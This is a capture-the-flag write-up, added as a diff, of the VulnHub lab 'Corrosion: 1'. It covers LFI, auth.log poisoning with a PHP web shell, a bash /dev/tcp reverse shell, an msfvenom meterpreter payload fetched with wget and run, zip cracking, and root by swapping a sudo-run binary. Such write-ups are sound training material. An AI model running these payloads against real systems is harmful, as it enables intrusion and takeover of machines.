@@ -1,0 +1,222 @@
+---
+title: "Corrosion: 1"
+platform: "VulnHub"
+difficulty: "Easy"
+os: "Linux"
+date: "2026-06-05"
+tags: ["linux", "lfi", "log-poisoning", "burpsuite", "meterpreter", "zip-cracking", "suid"]
+description: "VulnHub machine where a PHP file in an exposed archive directory is vulnerable to LFI. Poisoned auth.log via SSH to get RCE, upgraded to meterpreter, cracked a password-protected zip from backups, then replaced a SUID binary to get root."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.103"
+  rawHref="/writeups/raw/corrosion-1/nmap.txt"
+  output={`PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1
+80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works`}
+/>
+
+SSH and HTTP. Default Apache page on port 80.
+
+---
+
+## 2. HTTP Enumeration
+
+Gobuster on the root finds two directories worth looking at.
+
+<TerminalOutput
+  cmd="gobuster dir -w raft-large-directories.txt -u http://10.0.0.103"
+  rawHref="/writeups/raw/corrosion-1/gobuster.txt"
+  output={`tasks      (Status: 301) [--> http://10.0.0.103/tasks/]
+blog-post  (Status: 301) [--> http://10.0.0.103/blog-post/]`}
+/>
+
+`/tasks/tasks_todo.txt` has three items. It could be a hint. The first one seems to be more interesting:
+
+<TerminalOutput
+  cmd="curl http://10.0.0.103/tasks/tasks_todo.txt"
+  output={`1. Change permissions for auth log
+2. Change port 22 -> 7672
+3. Set up phpMyAdmin`}
+/>
+
+Auth log permissions haven't been changed yet. The `/blog-post/` page is signed by **randy**, i suppose that it could be a username.
+
+Running gobuster on `/blog-post/` finds an `archives/` subdirectory. It has directory listing on:
+
+<Screenshot
+  src="/screenshots/corrosion-1/archives-directory-listing.png"
+  alt="Directory listing of /blog-post/archives/ showing randylogs.php"
+  caption="/blog-post/archives/ — randylogs.php is sitting right there in the open"
+/>
+
+Interesting. I could not read the source code, but i feel like it can execute commands and I think it wants me to look at the **auth.log** from the hint above.
+
+---
+
+## 3. LFI in randylogs.php
+
+Fuzz the parameter name on `randylogs.php`:
+
+<TerminalOutput
+  cmd={`gobuster fuzz -w common.txt -u "http://10.0.0.103/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" --exclude-length 0`}
+  rawHref="/writeups/raw/corrosion-1/gobuster-lfi.txt"
+  output={`[Status=200] [Length=2832] [Word=file]`}
+/>
+
+Parameter is `file`. That means it can be used to read file.
+Now, Enable FoxyProxy to route traffic through Burp:
+
+<Screenshot
+  src="/screenshots/corrosion-1/foxyproxy-enable-burp.png"
+  alt="FoxyProxy popup with Burp proxy selected"
+  caption="Enabling FoxyProxy to intercept requests in Burp Suite"
+/>
+
+Test `?file=/var/log/auth.log` in Burp — it reads fine, confirming the file permissions todo task was never completed:
+
+<Screenshot
+  src="/screenshots/corrosion-1/burp-lfi-authlog.png"
+  alt="Burp Suite showing the LFI request reading /var/log/auth.log"
+  caption="LFI confirmed — auth.log is readable through randylogs.php"
+/>
+
+---
+
+## 4. Log Poisoning
+
+Since auth.log is readable, inject a PHP payload into it by connecting to SSH with the payload as the username:
+
+<TerminalOutput
+  cmd="nc 10.0.0.103 22"
+  output={`SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1
+<?php system($_GET['cmd']); ?>
+Invalid SSH identification string.`}
+/>
+
+<Note type="Tip">
+  The reason why i am using netcat here instead of SSH is because the SSH handles the error of entering the invalid character and terminates the request before it reaches the server.
+</Note>
+
+Now `auth.log` contains the PHP. Request `?file=/var/log/auth.log&cmd=whoami` in Burp — the response shows `www-data` at line **1194**:
+
+<Screenshot
+  src="/screenshots/corrosion-1/burp-rce-confirmed.png"
+  alt="Burp response showing www-data in the auth.log output confirming RCE"
+  caption="www-data appears in the response — the injected PHP is executing"
+/>
+
+---
+
+## 5. Reverse Shell
+
+Set up a listener, then craft the reverse shell payload and send it through `cmd`:
+
+```bash
+/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.52/8888 >&1'
+```
+
+In Burp Repeater, highlight the payload, right-click and URL-encode it before sending:
+
+<Screenshot
+  src="/screenshots/corrosion-1/burp-url-encode-shell.png"
+  alt="Burp Repeater right-click menu showing URL-encode key characters option"
+  caption="Right-click the payload in Burp and use Convert selection → URL → URL-encode key characters"
+/>
+
+Shell catches as `www-data`. From here, upgrade to a meterpreter session:
+
+<TerminalOutput
+  cmd="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.52 LPORT=9001 -f elf -o reverse.elf"
+  rawHref="/writeups/raw/corrosion-1/msfvenom.txt"
+  output={`Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: reverse.elf`}
+/>
+
+Serve it with `python -m http.server 80`, then from the www-data shell:
+
+<TerminalOutput
+  cmd="wget http://10.0.0.52/reverse.elf && chmod +x reverse.elf && ./reverse.elf"
+  output={`reverse.elf saved [250/250]`}
+/>
+
+Meterpreter session opens in the handler.
+
+---
+
+## 6. user_backup.zip
+
+Browsing `/var/backups/` in the meterpreter session turns up a `user_backup.zip`. Download it:
+
+<TerminalOutput
+  cmd="meterpreter > download user_backup.zip"
+  output={`[*] Downloaded 3.21 KiB of 3.21 KiB (100.0%): user_backup.zip`}
+/>
+
+It's password-protected. Convert it and crack with rockyou:
+
+<TerminalOutput
+  cmd="zip2john user_backup.zip > zipjohn.txt && john --wordlist=rockyou.txt zipjohn.txt"
+  rawHref="/writeups/raw/corrosion-1/zip-crack.txt"
+  output={`!randybaby  (user_backup.zip)`}
+/>
+
+Unzip with `!randybaby`. The archive contains `id_rsa`, `id_rsa.pub`, `easysysinfo.c`, and `my_password.txt`:
+
+<TerminalOutput
+  cmd="cat my_password.txt"
+  output={`randylovesgoldfish1998`}
+/>
+
+The blog post was signed by **randy**. SSH in:
+
+<TerminalOutput
+  cmd="ssh randy@10.0.0.103"
+  output={`randy@10.0.0.103's password:
+Welcome to Ubuntu 21.04
+randy@corrosion:~$`}
+/>
+
+<Note type="flag">
+  **user.txt** — `98342721012390839081`
+</Note>
+
+---
+
+## 7. Privilege Escalation
+
+`sudo -l` shows one entry:
+
+<TerminalOutput
+  cmd="sudo -l"
+  output={`(root) PASSWD: /home/randy/tools/easysysinfo`}
+/>
+
+The `tools/` directory is writable by randy (`drwxrwxr-x`). The zip included `easysysinfo.c` — the source for that binary, which just runs a few system commands. Since the directory is writable, the binary can be replaced.
+
+Write a malicious `script.c` that drops a root shell:
+
+<Screenshot
+  src="/screenshots/corrosion-1/malicious-c-code.png"
+  alt="C code with setuid(0), setgid(0), system('bash -i')"
+  caption="script.c — sets UID/GID to root then spawns bash"
+/>
+
+Delete the original binary, compile the replacement, and run it with sudo:
+
+<Screenshot
+  src="/screenshots/corrosion-1/root-flag.png"
+  alt="Terminal showing rm, gcc compile, sudo ./easysysinfo → root shell, cat root.txt showing the flag"
+  caption="Replace the SUID binary, sudo it → root. cat root.txt gives the flag."
+/>
+
+<Note type="flag">
+  **root.txt** — `FLAG: 4NJSA99SD7922197D7S90PLAWE`
+</Note>
